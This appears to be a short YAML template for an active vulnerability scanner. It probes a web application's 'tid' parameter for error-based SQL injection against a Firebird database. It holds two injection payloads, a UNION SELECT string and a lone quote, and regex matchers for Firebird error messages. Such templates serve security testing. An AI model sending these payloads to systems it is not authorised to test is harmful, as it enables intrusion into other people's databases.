id: sqli2-firebird-10
name: 'SQLi error firebird via tid'
severity: high
type: active
tags:
  - sqli
  - injection
  - firebird
description: 'Triggers firebird error via tid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tid:
        - ''' UNION SELECT NULL,NULL--'
        - ''''
    matchers:
      - type: regex
        part: body
        regex:
          - 'Firebird'
          - 'Dynamic SQL Error'
